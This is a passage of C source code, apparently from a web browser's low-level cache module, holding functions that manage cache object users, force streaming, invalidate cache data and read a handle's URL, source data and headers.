			user->queued_for_delete = true;

			llcache_object_add_user(newobject, newuser);
		} else {
			llcache_object_remove_user(object, user);
			llcache_object_add_user(newobject, user);
		}

		/* Add new object to uncached list */
		llcache_object_add_to_list(newobject,
				&llcache->uncached_objects);
	} else {
		/* We're the only user, so abort any fetch in progress */
		if (object->fetch.fetch != NULL) {
			fetch_abort(object->fetch.fetch);
			object->fetch.fetch = NULL;
		}

		object->fetch.state = LLCACHE_FETCH_COMPLETE;

		/* Invalidate cache control data */
		llcache_invalidate_cache_control_data(object);
	}

	return error;
}

/* See llcache.h for documentation */
nserror llcache_handle_force_stream(llcache_handle *handle)
{
	llcache_object_user *user = llcache_object_find_user(handle);
	llcache_object *object = handle->object;

	/* Cannot stream if there are multiple users */
	if (user->prev != NULL || user->next != NULL)
		return NSERROR_OK;

	/* Forcibly uncache this object */
	if (llcache_object_in_list(object, llcache->cached_objects)) {
		llcache_object_remove_from_list(object,
				&llcache->cached_objects);
		llcache_object_add_to_list(object, &llcache->uncached_objects);
	}

	object->fetch.flags |= LLCACHE_RETRIEVE_STREAM_DATA;

	return NSERROR_OK;
}

/* See llcache.h for documentation */
nserror llcache_handle_invalidate_cache_data(llcache_handle *handle)
{
	if (handle->object != NULL && handle->object->fetch.fetch == NULL &&
			handle->object->cache.no_cache ==
				LLCACHE_VALIDATE_FRESH) {
		handle->object->cache.no_cache = LLCACHE_VALIDATE_ONCE;
	}

	return NSERROR_OK;
}

/* See llcache.h for documentation */
nsurl *llcache_handle_get_url(const llcache_handle *handle)
{
	return handle->object != NULL ? handle->object->url : NULL;
}

/* See llcache.h for documentation */
const uint8_t *llcache_handle_get_source_data(const llcache_handle *handle,
		size_t *size)
{
	*size = handle->object != NULL ? handle->object->source_len : 0;

	return handle->object != NULL ? handle->object->source_data : NULL;
}

/* See llcache.h for documentation */
const char *llcache_handle_get_header(const llcache_handle *handle,
		const char *key)
{
	const llcache_object *object = handle->object;
	size_t i;

	if (object == NULL)
		return NULL;

	/* About as trivial as possible */
	for (i = 0; i < object->num_headers; i++) {
		if (strcasecmp(key, object->headers[i].name) == 0)
			return object->headers[i].value;
	}

	return NULL;
}

/* See llcache.h for documentation */
bool llcache_handle_references_same_object(const llcache_handle *a,
		const llcache_handle *b)
{
	return a->object == b->object;
}
